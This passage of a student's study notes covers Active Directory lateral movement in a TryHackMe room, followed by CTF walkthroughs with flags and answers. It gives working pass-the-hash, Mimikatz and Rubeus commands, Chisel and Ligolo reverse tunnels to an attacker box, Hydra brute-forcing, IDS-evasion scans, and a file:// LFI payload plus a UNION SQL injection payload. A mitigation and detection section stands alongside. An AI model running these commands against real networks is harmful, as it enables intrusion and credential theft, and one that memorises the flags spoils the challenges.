|AtExec|`atexec.py`|Scheduled one-shot task via Task Scheduler RPC|Medium — Event ID 4698|Both SCM and DCOM locked down|
|RDP|`xfreerdp`/`rdesktop`|Full GUI session (3389)|High — interactive logon 4624 Type 10|GUI access actually needed|
|NetExec|`nxc smb TARGET -x "cmd"`|SMB-based one-off execution|Varies|Quick command, no full session needed|

> [!note] Uniform authentication syntax across Impacket Every Impacket script accepts the same auth options — plaintext, `-hashes` (NTLM), `-k` (Kerberos) — so learning one script's syntax transfers directly to the rest.

**NetExec quick execution:**

```bash
nxc smb 192.168.13.61 -u jdoe -p 'Summer2026!' -d thm.loc -x 'whoami /all'       # cmd.exe (lowercase -x)
nxc smb 192.168.13.61 -u jdoe -p 'Summer2026!' -d thm.loc -X '$PSVersionTable'    # PowerShell (uppercase -X)
```

**Detection at a glance:**

|Event ID|Log|Indicates|
|---|---|---|
|4624 (Type 3)|Security|Network logon — every SMB/WinRM/WMI technique generates this|
|4648|Security|Explicit credential use — credentials passed directly|
|7045|System|New service installed — **the** PsExec/SMBExec signature|
|4697|Security|Service installed — newer equivalent of 7045|
|4698|Security|Scheduled task created — AtExec signature|
|4688|Security|Process creation — needs command-line auditing enabled to be useful|

> [!warning] The single most reliable PsExec indicator Event ID 7045 **combined with a short, randomised service name** — legitimate services almost never have 4-character random names. This specific pairing is worth knowing as a named detection pattern, not just "check for 7045."

> [!summary] Quick Recap — Remote Execution
> 
> - PsExec: SMB + `ADMIN$` write + service creation → SYSTEM shell, but noisy (file on disk, 7045 event, randomised service name)
> - Evil-WinRM: runs as the authenticated user (not SYSTEM), accepts `Remote Management Users` membership too, far quieter than PsExec
> - Always pre-check admin access with NetExec (`(Pwn3d!)`) before attempting PsExec — saves time and avoids failed-connection noise
> - Six alternative execution methods exist for when PsExec/WinRM are blocked or detected — each trades stealth for reliability differently

---

#### Pass-the-Hash and Credential Reuse

**The mechanism:** NTLM's challenge-response authentication uses the **NT hash itself** to compute the response — the plaintext password is never part of the exchange. The server cannot distinguish "a client that hashed the real password" from "a client that already possessed the hash." **Possessing the hash is functionally equivalent to possessing the password**, for NTLM authentication purposes specifically.

> [!warning] The hash confusion trap — two different things both casually called "NTLM hash"
> 
> |Type|Source|Format|Pass-the-Hash capable?|
> |---|---|---|---|
> |**NT hash**|SAM, NTDS.dit, LSASS memory (Mimikatz, secretsdump)|32 hex chars|**Yes**|
> |**Net-NTLMv2 hash**|Captured from network (Responder, `.url` coercion, LLMNR poisoning)|Long, multi-field: `user::DOMAIN:challenge:hmac:blob`|**No** — crack it or relay it|
> 
> These are not interchangeable. A Net-NTLMv2 hash is a one-time challenge-response artefact, not the underlying secret — it must be cracked offline (or relayed, a separate technique) to be useful. Only the raw NT hash — extracted directly from memory or a database — is ever usable for Pass-the-Hash.

**Using discovered loot:**

```
C:\Users\Administrator\Documents\loot.txt
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fa0....12:::
```

Format breakdown: `username:RID:LM_hash:NT_hash:::` — RID 500 = built-in Administrator; the LM hash shown is the standard empty/disabled value present on all modern Windows; **the NT hash is the actual target.**

**The real question:** does this same local admin hash work elsewhere? Without **LAPS**, the answer is frequently yes — the same local admin password (and therefore hash) reused across many machines.

**Scanning for where the hash grants access:**

```bash
nxc smb 192.168.13.61 192.168.13.51 -u Administrator -H fa....12 --local-auth
```

- `-H` — the NT hash (32 hex chars, or full `LM:NT`)
- **`--local-auth` is critical** — tells NetExec to authenticate against each target's **local SAM**, not the domain controller. A local Administrator hash will fail against domain auth, since it doesn't correspond to a domain account

Result: `(Pwn3d!)` on **both** WRK and SERVER1 — same local admin hash, both hosts. Exactly the scenario LAPS exists to prevent.

**Getting a shell via Pass-the-Hash:**

```bash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:fa.....12 Administrator@192.168.13.51
# or, LM portion left empty if unknown:
psexec.py -hashes :fa......12 Administrator@192.168.13.51
```

SYSTEM shell on SERVER1, **without ever knowing the plaintext password.**

**Chaining further loot:**

```
C:\Users\Administrator\Documents\da_creds.txt
THM\Administrator:500:aad3b435b51404eeaad3b435b51404ee:25....ea:::
```

A **Domain Administrator's** NT hash, found on SERVER1 — "likely left behind from a previous administrative session." This is lateral movement's core loop made concrete: the local admin hash from WRK got onto SERVER1, which held the actual domain-critical credential.

```bash
evil-winrm -i 192.168.13.51 -u Administrator -H fa....12
```

Evil-WinRM supports the identical `-H` Pass-the-Hash pattern.

**Beyond Pass-the-Hash — related credential reuse techniques (reference, deeper coverage later):**

**Pass-the-Ticket (PtT)** — inject a stolen Kerberos ticket (TGT or service ticket) directly into a session, useful when NTLM is restricted but Kerberos remains available:

```
mimikatz # kerberos::ptt ticket.kirbi
Rubeus.exe ptt /ticket:ticket.kirbi
```

**Overpass-the-Hash (Pass-the-Key)** — bridges NTLM and Kerberos: use an NT hash to request a legitimate Kerberos TGT from the KDC, converting a hash into a ticket:

```
mimikatz # sekurlsa::pth /user:Administrator /domain:thm.loc /ntlm:fa0.....12 /run:cmd.exe
```

The spawned shell shows the _original_ username under `whoami`, but `klist` reveals the injected Kerberos identity — demonstrating the protocol-bridging directly.

**Token Impersonation** — with existing SYSTEM access, steal the access token of any other currently-logged-in user, **no credentials or hashes needed at all**:

```
meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "THM\\Administrator"
```

Especially powerful if a Domain Admin happens to be logged into the same compromised host — their token sits in memory, ready to steal.

> [!warning] Why this matters at a structural level A single 32-character NT hash can unlock every host in the domain where that account holds admin rights. Without LAPS, one hash becomes the master key to the entire network — this is the concrete mechanism behind why credential harvesting (the previous room) is so dangerous, not just an abstract risk.

> [!summary] Quick Recap — Pass-the-Hash
> 
> - NT hash (from memory/disk) = Pass-the-Hash capable; Net-NTLMv2 hash (from network capture) is NOT — crack or relay it instead
> - `--local-auth` on NetExec is mandatory when testing a local account's hash — omitting it tries domain auth and fails even with a correct hash
> - `(Pwn3d!)` across multiple hosts with the same hash directly demonstrates the local-admin-password-reuse problem LAPS exists to solve
> - Each compromised host potentially holds the credential that unlocks the next — this room's WRK→SERVER1→DA-hash chain is the pattern in miniature
> - Pass-the-Ticket, Overpass-the-Hash, and Token Impersonation extend the same core idea to Kerberos and to zero-credential scenarios respectively

---

#### Pivoting

**The problem:** the Domain Controller and the WebServer's internal Gitea instance are both **unreachable directly** from the AttackBox — connection timeouts, not auth failures. They're on a network segment the AttackBox simply can't route to.

**Pivoting:** using a compromised host that _can_ reach both networks as a relay — tunnelling traffic through it to access otherwise-unreachable hosts.

**Two SSH forwarding types:**

**Local port forwarding (`ssh -L`)** — opens a port locally, forwards traffic through the tunnel to **one specific** destination:

```bash
ssh -L 13389:192.168.13.100:3389 jdoe@192.168.13.71 -N
```

- `-L 13389:192.168.13.100:3389` — listen locally on 13389, forward to `192.168.13.100:3389` **as seen from the WebServer**
- `-N` — tunnel only, no remote shell

Mnemonic: **-L = Local listens** — the left number is what the AttackBox opens; the right address/port is what the pivot host dials.

```bash
xfreerdp /v:127.0.0.1:13389 /u:Administrator /p:'...' /cert:ignore
```

Connecting to `127.0.0.1:13389` transparently reaches the DC's RDP — **from the DC's perspective, the connection originates from the WebServer**, not the AttackBox.

> [!note] One forward = one destination Fine for a single specific service, but scanning multiple hosts or ports means a new `-L` per destination — tedious fast. This is exactly the gap dynamic forwarding closes.

**Dynamic port forwarding (`ssh -D`)** — a full **SOCKS proxy**, any destination through one tunnel:

```bash
ssh -f -D 1080 jdoe@192.168.13.71 -N
```

`-f` backgrounds the connection; SOCKS proxy live on `127.0.0.1:1080`.

**ProxyChains** routes arbitrary TCP tools through the SOCKS proxy — configure `/etc/proxychains.conf`:

```
[ProxyList]
socks4 127.0.0.1 1080
```

```bash
proxychains curl -s http://192.168.13.71 | head -20
```

The same URL that timed out directly now succeeds — traffic exits from the WebServer's own network stack, bypassing the restriction entirely.

> [!note] Browser-level pivoting works too Firefox: Settings → Network → Manual proxy → SOCKS Host `127.0.0.1`, Port `1080`, SOCKS v4 — browses internal services (Gitea) directly through the pivot.

**Reaching the ultimate objective — the DC, through the tunnel:**

```bash
proxychains nxc smb 192.168.13.100 -u Administrator -H 250......ea
# (Pwn3d!) — DA hash valid on the DC, reachable through the tunnel

proxychains psexec.py -hashes :25.....ea thm.loc/Administrator@192.168.13.100
```

```
C:\Windows\system32> hostname
RDC1
```

**SYSTEM on the Domain Controller** — the complete chain: SSH foothold → PsExec to WRK → local admin hash found → Pass-the-Hash to SERVER1 → DA hash found → SSH SOCKS pivot through WebServer → Pass-the-Hash to the DC.

> [!warning] ProxyChains caveats — know these before relying on it
> 
> - **TCP only** — UDP and ICMP silently dropped; `nmap -sU` and `ping` simply don't work through the tunnel
> - Use `nmap -sT` (connect scan), **never** `-sS` (SYN scan needs raw sockets, incompatible with SOCKS)
> - Always add `-Pn` to Nmap — skips ICMP-based host discovery, which would otherwise report every host as down
> - **DNS can leak** — ProxyChains may resolve hostnames locally by default; uncomment `proxy_dns` in the config to route DNS through the tunnel too when using hostnames instead of IPs

**Beyond SSH — more advanced pivoting tools (reference, deeper coverage later):**

**Chisel** — single-binary TCP tunnel over HTTP, useful when SSH isn't available (e.g. a Windows pivot host with no OpenSSH):

```bash
# AttackBox (server)
chisel server --port 8080 --reverse
# Compromised host (client)
chisel.exe client ATTACKBOX_IP:8080 R:1080:socks
```

Same SOCKS4 proxy result as SSH dynamic forwarding, but over HTTP — traverses firewalls permitting only outbound web traffic.

**Ligolo-ng** — a fundamentally different approach: creates a **virtual TUN interface** on the AttackBox rather than a SOCKS proxy. Traffic to that interface tunnels through the compromised host natively — **no ProxyChains, no `-sT -Pn` workarounds**, tools just work as if directly on the internal network:

```bash
# AttackBox (proxy)
sudo ./proxy -selfcert
# Compromised host (agent)
./agent -connect ATTACKBOX_IP:11601 -accept-fingerprint FINGERPRINT
# AttackBox — add route and go
sudo ip route add 192.168.13.0/24 dev ligolo
nxc smb 192.168.13.0/24 -u jdoe -p 'Summer2026!'
```

Steeper learning curve than SSH, but the preferred choice for complex multi-pivot engagements.

> [!summary] Quick Recap — Pivoting
> 
> - `-L` (local forward) = one fixed destination through the tunnel; `-D` (dynamic forward) = full SOCKS proxy, any destination
> - ProxyChains wraps arbitrary tools to route through a SOCKS proxy — but TCP-only, needs `-sT -Pn` for Nmap, and can DNS-leak without `proxy_dns` enabled
> - The DC was reachable throughout — just not _directly_; pivoting through WebServer (which has the needed network path) was the only missing piece
> - Chisel (HTTP-based, Windows-pivot-friendly) and Ligolo-ng (native TUN interface, no wrapper needed) are the advanced alternatives once SSH pivoting's limits are reached

---

#### How It All Chains Together

```
SSH foothold on WebServer (jdoe)
        │
        ▼
PsExec → SYSTEM on WRK (jdoe is local admin)
        │  → finds local Administrator's NT hash in loot.txt
        ▼
Pass-the-Hash (NetExec scan confirms reuse) → SYSTEM on SERVER1
        │  → finds Domain Admin's NT hash in da_creds.txt
        ▼
SSH dynamic forward (SOCKS proxy) through WebServer
        │  → DC otherwise unreachable directly
        ▼
proxychains psexec.py with the DA hash → SYSTEM on ROOTDC
```

Each technique built directly on the previous one's output: starting credentials unlocked remote execution; the hash found on WRK extended reach to SERVER1; the DA hash found there unlocked the DC itself; the tunnel through WebServer was what made _using_ that final hash physically possible. **This is the move → harvest → move loop, demonstrated end to end.**

---

#### Mitigation

Every control below maps directly to a technique exploited in this room — for each attack path used, there's a specific defence that would have stopped it.

**Local Administrator Password Solution (LAPS)** — directly answers the Task 4 Pass-the-Hash chain, which worked _because_ the same local admin password/hash was reused across WRK and SERVER1. **Windows LAPS** (native in Windows 11 22H2+, Server 2022/2025) auto-generates a unique, rotated password per machine, stored securely in AD. One compromised local admin hash becomes useless everywhere else — this single control directly breaks the exact chain demonstrated in this room.

**Restricting Local Administrator Rights** — most remote execution requires local admin on the target; without it, most techniques simply fail outright.

- Standard users should never be local admin on other hosts (ideally not even their own)
- Administrative access via dedicated admin accounts, separate from daily-use accounts
- **Tiered administration model:** Tier 0 (Domain Admins) → Tier 0 systems only; Tier 1 (server admins) → servers only; Tier 2 (workstation admins) → workstations only

> [!note] A single permission removed would have stalled the entire chain `jdoe`'s local admin status on WRK specifically is what enabled the Task 3 PsExec foothold — remove that one permission and the whole subsequent chain never gets off the ground.

**SMB Signing** — defeats relay attacks and reduces SMB-based execution reliability. Configured via two GPO settings (Computer Configuration → Security Options): **"Microsoft network server: Digitally sign communications (always)"** and the matching client-side setting, both set to **Enabled**.

> [!note] This lab deliberately disabled it Windows Server 2025 and recent Windows 11 builds now require SMB signing **by default** — a meaningful shift from manual GPO configuration. The lab turned it off specifically to let the exercises function.

**Restricting NTLM Authentication** — Pass-the-Hash fundamentally depends on NTLM. GPO controls (Computer Configuration → Security Options → Network Security): **"Restrict NTLM: NTLM authentication in this domain"** → `Deny All` forces Kerberos-only; **"Restrict NTLM: Audit NTLM authentication"** enables pre-enforcement visibility into what still depends on NTLM. Full disablement is often impractical (legacy dependencies) — audit first, remediate, enforce incrementally.

**Credential Guard** — virtualisation-based security (VBS) isolating LSASS secrets in a protected container, preventing Mimikatz-style extraction **even with SYSTEM access**. If enabled on WRK in this lab, `loot.txt`'s hash would never have been extractable in the first place — the earliest possible point of failure for the entire chain.

**Host Firewall Rules** — workstations rarely have a legitimate reason to talk to each other over SMB/WinRM/RDP. GPO-deployed Windows Defender Firewall rules blocking inbound admin-protocol traffic between workstations (while permitting it from legitimate management servers) would have **entirely prevented** the Task 3 PsExec move to WRK.

**Network Segmentation** — the Task 5 pivot worked because WebServer had a network path to every host, including the DC.

- Workstations, servers, DCs on separate VLANs with controlled inter-VLAN traffic
- East-west workstation-to-workstation traffic blocked/heavily restricted
- DCs on a dedicated, hardened subnet, inbound restricted to specific management jump hosts
- DC outbound internet access blocked entirely

> [!note] Segmentation slows, it doesn't fully stop Doesn't eliminate lateral movement outright, but forces attackers through monitored choke points — meaningfully raising detection odds even when it doesn't prevent the movement itself.

**Privileged Access Workstations (PAWs)** — a hardened, dedicated machine used **exclusively** for Tier 0 administration, physically separate from an admin's daily-driver workstation. This breaks credential theft at its root: even full compromise of the daily workstation never exposes a Tier 0 secret, because none ever touched its LSASS memory.

> [!warning] The DA hash on SERVER1 is the textbook argument for PAWs A Domain Admin credential had no legitimate reason being cached on a standard server at all — PAWs exist specifically to ensure Tier 0 secrets never land anywhere outside dedicated Tier 0 infrastructure.

**Monitoring and Detection:**

|Event ID|Log|Alert On|
|---|---|---|
|4624 (Type 3)|Security|Network logon from unexpected source — e.g. workstation-to-workstation|
|4624 (Type 10)|Security|RDP logon — especially a Domain Admin RDPing to a workstation|
|4648|Security|Explicit credential use — `runas`, PsExec with alt creds, mapped drives with different creds|
|7045|System|New service installed — PsExec hallmark, especially with a short random name|
|4698|Security|Scheduled task created — AtExec signature|
|4688|Security|Process creation — needs command-line auditing GPO enabled to be useful|

**Sysmon** fills gaps the default audit policy misses: **Event ID 1** (process creation with hashes + parent process detail) and **Event ID 10** (process access — alerts on any non-AV process opening a handle to `lsass.exe`) are specifically valuable against credential theft and lateral movement tooling.

> [!note] The underlying detection principle Lateral movement produces **anomalous authentication patterns** — one account hitting dozens of hosts rapidly, workstation-to-workstation SMB, a service account logging on interactively. These stand out clearly with proper logging/alerting in place; the challenge is almost always coverage and tuning, not signal availability.

> [!summary] Quick Recap — Mitigation
> 
> - LAPS directly breaks this room's central Pass-the-Hash chain — unique per-host local admin passwords make one stolen hash useless elsewhere
> - Removing `jdoe`'s local admin on WRK alone would have stalled the entire demonstrated attack chain at its first step
> - Credential Guard would have prevented the hash in `loot.txt` from ever being extractable — the earliest possible break point
> - PAWs exist specifically because a Domain Admin hash has no legitimate reason being cached on a standard server, exactly as seen on SERVER1 in this room
> - Detection hinges on anomalous authentication _patterns_, not single events — 4624/4648/7045/4698/4688 plus Sysmon 1/10 together build that picture

---

> [!summary] Full Intro to AD Lateral Movement Room — One Glance
> 
> - Three pillars: remote execution (PsExec=SYSTEM+noisy, WinRM=user-context+quiet), credential reuse (Pass-the-Hash via NT hashes only — never Net-NTLMv2), pivoting (SSH `-L`/`-D`+ProxyChains, or Chisel/Ligolo-ng for advanced cases)
> - The complete demonstrated chain: SSH foothold → PsExec to WRK (finds local admin hash) → Pass-the-Hash to SERVER1 (finds DA hash) → SSH SOCKS pivot through WebServer → Pass-the-Hash to the DC — zero exploits, pure credential discovery and reuse at every step
> - `(Pwn3d!)` in NetExec output is the universal "this will work" signal, whether testing plaintext creds or a hash, with or without `--local-auth`
> - Every mitigation maps to a specific technique demonstrated: LAPS↔hash reuse, admin rights restriction↔remote execution, SMB signing/NTLM restriction↔PtH, Credential Guard↔hash extraction itself, segmentation/firewalls↔pivoting, PAWs↔credential caching, and Sysmon-backed monitoring↔the whole chain's authentication footprint
> - This room completes the Active Directory arc: breach → enumerate (unauthenticated, then authenticated) → harvest credentials → move laterally — the full attack chain from zero access to Domain Controller compromise
## CTF Practice Rooms
### 1. Net Sec Challenge

**Methodology**

**1. Full Port Enumeration (Discovery Phase)**
To ensure no services were missed, a comprehensive scan of all 65,535 TCP ports was conducted.
- **Command**: `nmap -sS -oG Net_Sec_Grepable_Nmap -p- -A 10.114.168.168`
- **Analysis**:
  - **Port 10021**: Identified an **FTP** service (`vsftpd 3.0.5`) running on a non-standard port.
  - **Port 8080**: A secondary **HTTP** server using `Node.js (Express)`.
  - **Stealth Flags**: Two flags were leaked directly in the service banners:
    - **SSH Flag**: `THM{946219583339}` (Found via fingerprint strings).
    - **HTTP Flag**: `THM{web_server_25352}` (Found in the server header).

**2. Manual Service Verification (Banner Grabbing)**
Using `telnet` to interact with services manually confirmed the versions and captured flags that automated tools might miss.
- **HTTP Header**: `telnet 10.114.168.168 80` confirmed the `lighttpd` server and the flag.
- **SSH Banner**: `telnet 10.114.168.168 22` immediately displayed the OpenSSH version and the hidden flag.

**3. Password Cracking & FTP Exploitation**
After gathering usernames (`quinn`, `eddie`), a dictionary attack was launched against the non-standard FTP port.
- **Tool**: **Hydra**
- **Command**: `hydra -l quinn -P /home/deadcode/Desktop/rockyou.txt 10.114.168.168 ftp -s 10021`
- **Success**: Found valid credentials → `quinn : andrea`.
- **File Retrieval**:
  1. Logged in via `ftp 10.114.168.168 10021`.
  2. Switched to passive mode (automatically handled by the client).
  3. Used `get ftp_flag.txt` to download the file to the local machine.
  4. **Flag**: `THM{321452667098}`

**4. IDS Evasion Strategy (The Stealth Challenge)**
The final challenge required scanning the target without alerting the Intrusion Detection System (IDS).
- **Attempt 1 (Failed)**: `nmap -sS -f` (Fragmentation). The IDS was able to reassemble the packets or detect the SYN scan, resulting in "Filtered" ports.
- **Attempt 2 (Impractical)**: `nmap -sS -T1`. While stealthy, the timing was too slow for a real-time engagement.
- **The Solution (Null Scan)**:
  - **Command**: `sudo nmap -sN 10.114.168.168`
  - **Logic**: By sending a TCP packet with **no flags set**, the scan bypassed the IDS rules which were likely looking for SYN packets (start of a handshake). Since the target was a Linux system, it responded to the Null scan correctly, identifying the open ports.
  - **Final Flag**: `THM{f7443f99}`

**Key Takeaways for PT1 Exam:**
1. **Service Port Mapping**: Never assume a service is on its default port. Always use `-p-` if the initial scan feels incomplete.
2. **Banner Grabbing**: Tools like `telnet` and `nc` are vital for manual verification of service headers.
3. **IDS Evasion**: If a standard SYN scan (`-sS`) is blocked, rotate through **Stealth Scans** (Null `-sN`, FIN `-sF`, or Xmas `-sX`).
4. **Output Management**: Saving results in Grepable format (`-oG`) makes it much faster to find specific flags or versions in large scan files.

**Challenge Questions:**

| Question | Answer |
|---|---|
| What is the highest port number being open less than 10,000? | 8080 |
| There is an open port outside the common 1000 ports; it is above 10,000. What is it? | 10021 |
| How many TCP ports are open? | 6 |
| What is the flag hidden in the HTTP server header? | `THM{web_server_25352}` |
| What is the flag hidden in the SSH server header? | `THM{946219583339}` |
| We have an FTP server listening on a nonstandard port. What is the version of the FTP server? | vsftpd 3.0.5 |
| We learned two usernames using social engineering: `eddie` and `quinn`. What is the flag hidden in one of these two account files and accessible via FTP? | `THM{321452667098}` |
| Browsing to `http://10.114.168.168:8080` displays a small challenge that will give you a flag once you solve it. What is the flag? | *(solve interactively on the box)* |
| Mission: use Nmap to scan 10.114.168.168 as covertly as possible and avoid the IDS. | `sudo nmap -sN 10.114.168.168` → `THM{f7443f99}` |

> [!summary] Quick Recap — Net Sec Challenge / PT1 Exam Takeaways
> - Never assume default ports — always run a full `-p-` pass if the picture feels incomplete
> - `telnet`/`nc` for manual banner verification, always
> - If SYN scan gets blocked, rotate through Null/FIN/Xmas before assuming the port is truly closed
> - Save scans in grepable format (`-oG`) — much faster to search later for flags/versions

---

### 2. Recruit — CTF Walkthrough & Report

> [!info] Room context **Recruit** — a recruitment portal allowing HR staff to manage candidate applications and administrators to oversee hiring decisions. Objective: assess the application as a real attacker would — map the structure, abuse exposed functionality, and chain vulnerabilities to escalate from unauthenticated access to full administrator takeover.

> [!summary] Executive Summary Assessment of the Recruiting Portal (`10.113.173.79`) uncovered a chain of vulnerabilities — information disclosure via exposed mail logs, an LFI/SSRF flaw in a CV-fetching endpoint, and an authenticated Union-Based SQL Injection — that together allowed a complete escalation path: **unauthenticated → HR user → full administrator access**, including exposure of application configuration and database credentials.

---

#### Phase 0 — Reconnaissance

**Approach:** rather than guessing at a single tool, start with full port/service enumeration to establish the actual attack surface before committing to a web-only or credential-based path.

```bash
nmap -sS -p- 10.114.136.152
nmap -sS -A -p 22,53,80 10.114.136.152
```

**Results:**

|Port|Service|Version|
|---|---|---|
|22|SSH|OpenSSH 8.2p1 Ubuntu 4ubuntu0.7|
|53|DNS|ISC BIND 9.16.1 (Ubuntu)|
|80|HTTP|Apache 2.4.41 (Ubuntu), page title "Recruit"|

**Triage of the three open ports:**

- **SSH (22)** — needs valid credentials, no immediate path in; parked for later if credentials surface elsewhere
- **DNS (53)** — noted as a possible secondary lead (zone data, shared records) but not the priority
- **HTTP (80)** — clearly the primary attack surface; a full recruitment portal on a stock Apache/PHP stack is where the actual functionality (and likely the vulnerabilities) lives

> [!note] Prioritisation logic With three open ports and no existing credentials, the web service is the only one offering unauthenticated interactive attack surface — the natural next step, rather than trying to brute-force SSH blind or dig speculatively into DNS with no known zone.

**Content discovery with Gobuster:**

```bash
gobuster dir -u http://10.114.182.179:80 \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -x php,txt,html -t 20
```

**Key findings:**

```
index.php            (200)
header.php           (200)
mail                 (301) → /mail/
assets               (301) → /assets/
footer.php           (200)
file.php             (200)
api.php              (200)
javascript           (301) → /javascript/
logout.php           (302) → index.php
config.php           (200, size 0)
dashboard.php        (302) → index.php
phpmyadmin           (301) → /phpmyadmin/
server-status         (403)
```

The `/mail/` directory stood out immediately as unexpected — a mail-related path exposed on a web-accessible directory listing warrants direct investigation.

> [!summary] Quick Recap — Reconnaissance
> 
> - Full-range Nmap scan first to establish the real attack surface (SSH/DNS/HTTP) before picking a direction
> - Three open ports triaged by exploitability: HTTP wins as the only unauthenticated interactive surface
> - Gobuster content discovery surfaced an anomalous `/mail/` directory alongside the expected app files — worth investigating before touching anything else

---

#### Phase 1 — Information Disclosure via Exposed Mail Log

**Discovery:** the `/mail/` directory contained a file, `mail.log`, readable directly over HTTP — an internal deployment log that should never have been web-accessible.

**Contents (relevant excerpt):**

```
Subject: Recruitment Portal Deployment Confirmation
From: HR Team <hr@recruit.thm>
To: IT Support <it-support@recruit.thm>

...
As discussed during deployment:
- HR login credentials (username: hr) are currently stored in the application
  configuration file (config.php) for ease of access during
  the initial rollout phase.
- Administrator credentials are NOT stored in the application
  files and are securely maintained within the backend database.
```

**What this leaked, directly usable for the next steps:**

- A confirmed username: **`hr`**
- Confirmation that HR's password lives in `config.php` — a direct pointer to the next target
- Confirmation that admin credentials live in the **database**, not the filesystem — ruling out the same file-read approach for admin and pointing toward a database-facing vector (SQLi) later on

> [!warning] Why this matters beyond just "found a password" This single log file didn't just leak a credential — it leaked the **attack plan**. It told us exactly where to look next (`config.php` for HR, the database for admin) before a single exploit had been attempted. Internal operational logs (deployment confirmations, mail logs, changelogs) are a routinely underrated recon source precisely because they describe the _architecture_ of a fix or rollout, not just isolated secrets.

> [!summary] Quick Recap — Information Disclosure
> 
> - An internal deployment log left in a public, web-accessible `/mail/` directory
> - Leaked a valid username (`hr`) and — critically — told us exactly _where_ each credential set lived (file vs. database), shaping the rest of the attack chain before any exploitation occurred

---

#### Phase 2 — Parameter Discovery on `file.php`

`file.php` returned content on a plain GET but gave no indication of what parameter it expected. Rather than guessing manually, this called for automated parameter fuzzing.

**Tool: Wfuzz**, fuzzing parameter _names_ (not values) against `file.php`:

```bash
wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt \
  http://10.114.182.179/file.php?FUZZ=test
```

Initial results were noisy — most payloads returned an identical baseline response (20 characters), meaning the error message itself needed to be used as the filter rather than status code alone. Filtering that baseline out (`--hc`/response-size filtering, applied correctly after correcting the invalid `--hb` flag used in an earlier attempt) isolated the real signal: a request with **no valid parameter name** produced a distinct, informative error:

```
Missing cv parameter
```

**Parameter identified: `cv`**

> [!note] Fuzzing lesson The useful signal here wasn't a parameter that returned something _different_ — it was the **absence** of a valid parameter producing an explicit, named error message (`Missing cv parameter`). Reading error text carefully, rather than only filtering by response code/size, is often what actually reveals a parameter name — the application told us what it wanted directly.

> [!summary] Quick Recap — Parameter Discovery
> 
> - Wfuzz fuzzed parameter _names_ against an undocumented endpoint rather than guessing manually
> - The real signal was an explicit error message (`Missing cv parameter`) once noise was filtered out — reading error text, not just status codes, found the parameter

---

#### Phase 3 — LFI via SSRF Filter Bypass (`file.php?cv=`)

`api.php` documented the endpoint directly:

> You can fetch a candidate CV using the following endpoint: `/file.php?cv=<URL>`. The API supports fetching CVs from external URLs such as HTTP and HTTPS. Requests targeting restricted locations may be blocked by the API.

**Testing a direct local path:**

```
http://10.113.173.79/file.php?cv=config.php
```

→ `Only local files are allowed`

This response is the key signal: the application is actively filtering/validating input to **restrict to local files only** — meaning it expects a URL scheme, and is blocking anything that doesn't look like an external fetch, or is blocking access outside an expected format. The fix was to satisfy that expectation explicitly using the `file://` scheme:

```
http://10.113.173.79/file.php?cv=file:///var/www/html/config.php
```

**Result — full `config.php` contents returned:**

```php
$APP_NAME        = 'Recruit';
$APP_ENV         = 'production';
$APP_VERSION     = '1.2.4';
$HR_PASSWORD     = 'hrpassword123';
$API_ENABLED     = true;
$API_VERSION     = 'v1';
```

**Credentials confirmed:** `hr` / `hrpassword123` — exactly where the mail log said to look.

**Logging in** at the dashboard with these credentials returned:

> **Flag 1:** `THM{LOGGED_IN_USER}`

**Follow-up attempt** — `index.php` was also fetched via the same technique, revealing further includes:

```php
include 'config.php';
include '/var/www/db.php';
include 'header.php';
```

Attempting the same LFI technique against `db.php` (the likely database credentials file):

```
http://10.113.173.79/file.php?cv=file:///var/www/db.php
```

→ **Access denied** — this specific path was explicitly blocked, unlike `config.php`. This confirmed the filter was doing _some_ targeted blocking (likely a path-based deny list) rather than being fully absent — a dead end for this particular technique, and a signal to pivot to a different vector for admin-level access rather than pushing further on file reads.

> [!summary] Quick Recap — LFI via Filter Bypass
> 
> - "Only local files are allowed" was a misconfigured restriction, not a real barrier — it told us exactly what format (`file://`) would be accepted instead of blocking the read entirely
> - `file:///var/www/html/config.php` returned the HR password directly, confirming the mail log's tip and yielding the first flag
> - `db.php` was explicitly deny-listed — confirmed the filter does _some_ targeted blocking, and marked this path as a dead end, prompting a pivot to the login search bar next

---

#### Phase 4 — Authenticated Union-Based SQL Injection

With HR-level dashboard access established, the natural next target was any input field within the authenticated app — the candidate search bar stood out.

**Detection:** injecting a single quote (`'`) into the search field returned a raw MySQL syntax error:

```
SQL Error:
You have an error in your SQL syntax; check the manual that corresponds to your 
MySQL server version for the right syntax to use near '%'' at line 1
```

This confirms unsanitised input reaching a live SQL query — and the `%'` in the error hints the input is being wrapped in a `LIKE '%...%'` pattern-match query, useful context for shaping the injection payload.

**Exploitation** — Union-Based extraction targeting the `users` table:

```sql
' UNION SELECT 1,username,password,4 FROM users-- -
```

**Result — the search results table rendered both legitimate candidate rows and the injected admin row together:**

|ID|Name|Position|Status|
|---|---|---|---|
|1|Alice Johnson|Frontend Developer|Approved|
|2|Bob Smith|Backend Developer|Under Review|
|3|Charlie Brown|Security Analyst|Rejected|
|4|Diana Prince|HR Executive|Selected|
|1|`admin`|`admin@001admin`|4|

The injected row's `username`/`password` values landed directly in the "Name"/"Position" display columns — confirming the column count (4) and mapping matched on the first attempt.

**Credentials extracted:** `admin` / `admin@001admin`

**Logging in as admin:**

> **Flag 2:** `THM{LOGGED_IN_ADM1N1}`

> [!summary] Quick Recap — SQL Injection
> 
> - A single `'` in the candidate search bar surfaced a raw MySQL error — confirming unsanitised input, and the `%'` fragment hinted at the underlying `LIKE` query structure
> - Union-Based payload against `users` succeeded on the first attempt because the correct column count (4) was inferable from the visible result table's own structure
> - Injected data rendered inline with legitimate results — a Union-Based tell: attacker-controlled rows appear seamlessly alongside real application data

---

#### Full Attack Chain — One Glance

```
Unauthenticated
     │
     ▼
Gobuster discovers /mail/mail.log  (info disclosure)
     │  → username "hr" confirmed
     │  → tells us: HR pass is in config.php, admin creds are in the DB
     ▼
Wfuzz discovers the "cv" parameter on file.php  (parameter fuzzing)
     │
     ▼
file:// scheme bypasses "local files only" filter  (LFI/SSRF)
     │  → config.php leaked → HR credentials (hr / hrpassword123)
     ▼
Login as HR  →  FLAG 1: THM{LOGGED_IN_USER}
     │
     ▼
Candidate search bar vulnerable to SQL Injection  (Union-Based)
     │  → admin credentials extracted from `users` table
     ▼
Login as admin  →  FLAG 2: THM{LOGGED_IN_ADM1N1}
